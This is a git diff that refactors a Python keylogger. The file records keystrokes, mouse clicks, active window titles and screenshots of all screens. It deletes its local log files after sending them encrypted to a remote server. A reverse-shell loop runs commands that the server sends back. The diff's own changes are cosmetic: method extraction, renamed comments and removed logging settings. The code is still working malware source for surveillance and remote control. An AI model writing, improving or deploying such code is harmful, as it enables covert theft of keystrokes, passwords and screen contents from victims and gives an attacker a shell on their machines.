@@ -16,9 +16,6 @@ from screeninfo import get_monitors
 from threading import Thread
 from win32gui import GetWindowText, GetForegroundWindow
 
-#logging.basicConfig(level=logging.DEBUG) # Show Console Output
-logging.basicConfig(level=logging.WARN) # Dont show Console Output
-
 class Keylogger:
     def __init__(self, log_interval, window_interval, reconnect_interval):
         self.active = False
@@ -43,7 +40,7 @@ class Keylogger:
 
         ImageGrab.grab = partial(ImageGrab.grab, all_screens=True) # Take Screenshots of all Screens at once
 
-#--------------- CALLBACK FUNCTIONS ---------------#
+#--------------- CALLBACK METHODS ---------------#
     def keyboard_callback(self, event):
         if self.active:
             name = event.name
@@ -67,7 +64,7 @@ class Keylogger:
         if self.active:
             self.log += f"[R_CLICK, {mouse.get_position()}]"
 
-#--------------- FILE FUNCTIONS ---------------#
+#--------------- FILE METHODS ---------------#
     def write_information_file(self):
         if not os.path.exists(self.log_directory):
                 os.makedirs(self.log_directory)
@@ -122,7 +119,7 @@ class Keylogger:
         filename = f"screenshot-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}-{self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}.png"
         pyautogui.screenshot(os.path.join(self.log_directory, filename))
 
-#--------------- SERVER FUNCTIONS ---------------#
+#--------------- SERVER METHODS ---------------#
     def connect_to_host(self):
         self.sock = socket.socket()
         while not self.connected:
@@ -146,14 +143,16 @@ class Keylogger:
                 logging.debug(err)
                 self.connect_to_host()
 
+    def send_header_to_server(self, number_of_chunks, filename, number_of_files_left):
+        header = "__".join([number_of_chunks, filename, number_of_files_left]).encode(utils.ENCODING)
+        self.encrypt_and_send(header)        
+
     def send_message_to_server(self, data: str):
         chunk_size = utils.BUFFSIZE-96
         data = data.encode(utils.ENCODING)
         chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)] # split data in chunks of chunk_size to send them one by one
 
-        # create and send header, containing filename and number of chunks that will be sent
-        header = str(len(chunks)).encode(utils.ENCODING)
-        self.encrypt_and_send(header)
+        self.send_header_to_server(str(len(chunks)), "", "")
         
         for chunk in chunks:
             self.encrypt_and_send(chunk)
@@ -167,15 +166,17 @@ class Keylogger:
             data = read_file_and_delete(file)
             chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)] # split data in chunks of chunk_size to send them one by one
 
-            # create and send header, containing filename and number of chunks that will be sent
-            header = "__".join([os.path.split(file)[1], str(len(chunks)), str(number_of_files-index)]).encode(utils.ENCODING)
-            self.encrypt_and_send(header)
+            number_of_chunks = str(len(chunks))
+            filename = os.path.split(file)[1]
+            number_of_files_left = str(number_of_files-index)
             
+            self.send_header_to_server(number_of_chunks,filename,number_of_files_left)            
+
             for chunk in chunks:
                 self.encrypt_and_send(chunk)
                 time.sleep(0.005)
 
-    def receive_message_from_server(self):
+    def receive_command_from_server(self):
         try:
             recv = self.sock.recv(utils.BUFFSIZE)
             plaintext = utils.decrypt(recv).decode(utils.ENCODING)
@@ -185,7 +186,7 @@ class Keylogger:
                 logging.debug(err)
                 self.connect_to_host()
 
-#--------------- POLLING FUNCTIONS ---------------#
+#--------------- POLLING METHODS ---------------#
     def check_foreground_window(self):
         while True:
             if self.active:
@@ -249,6 +250,7 @@ def execute_command(command:str) -> str:
     else:
         return stdout
 
+
 #--------------- MAIN ---------------#
 if __name__ == "__main__":
     reverse_shell_active = False
@@ -257,7 +259,7 @@ if __name__ == "__main__":
     keylogger.connect_to_host()
 
     while True:
-        recv = keylogger.receive_message_from_server()
+        recv = keylogger.receive_command_from_server()
         if recv:
             if reverse_shell_active:
                 if recv == "exit":
